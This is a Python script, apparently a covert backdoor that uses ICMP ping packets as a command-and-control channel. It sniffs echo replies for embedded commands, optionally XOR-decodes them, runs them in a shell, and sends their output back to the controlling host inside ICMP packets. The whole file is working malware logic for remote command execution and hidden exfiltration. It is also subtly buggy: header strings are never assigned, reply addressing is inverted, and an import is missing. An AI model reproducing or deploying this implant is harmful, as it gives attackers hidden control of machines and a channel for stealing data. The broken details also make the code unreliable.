from scapy.all import *
from scapy.all import IP,ICMP
from subprocess import Popen, PIPE

def encrypt_decrypt(plaintext):
    KEY = "B"
    encrypted = ""
    for i in range(len(plaintext)):
        encrypted += chr(ord(plaintext[i]) ^ ord(KEY)) 
    return encrypted

def send_over_icmp(server, response, SSM, execute):
    header = ""
    if SSM and execute: header + "###$1"
    elif SSM and not execute: header + "###$0"
    elif not SSM and execute: header + "###01"
    elif not SSM and not execute: header + "###00"
    else: header + "###__"
    serverresponse = header + response
    evil = IP(dst=server)/ICMP(type=8)/(serverresponse)
    send(evil)

def execute_command(server, command, SSM):
    p = subprocess.Popen(command, stdout=PIPE, stderr=PIPE, shell=True)
    output, error = p.communicate()
    send_over_icmp(server, str(output), SSM, True)

def reply(src, command, SSM):
    if command == "PING":
            send_over_icmp(src, "PONG", SSM, False)
    else:
        send_over_icmp(src, "ACKNOWLEDGED", SSM, False)

def handle(pkt):
    execute = False
    SSM = False
    src = pkt[IP].dst
    payload = str(pkt.payload)
    parsed = re.split('!{3}', payload)
    if len(parsed) == 1:
        return
    else: 
        # Deal with useless code 
        command = parsed[1][:-1]
        if command[0] == "0" and command[1] == "0":
            SSM = False
            execute = False
        elif command[0] == "$" and command[1] == "0":
            SSM = True
            execute = False
        elif command[0] == "$" and command[1] == "1":
            SSM = True
            execute = True
        elif command[0] == "0" and command[1] == "1":
            SSM = False
            execute = True
        else:
            print("Error?")

        command = command[2:]
        if SSM: command = encrypt_decrypt(command)

        if execute: execute_command(src, command, SSM)
        else: reply(src, command, SSM)
    
        

sniff(filter="icmp[icmptype] == icmp-echoreply", prn=handle)
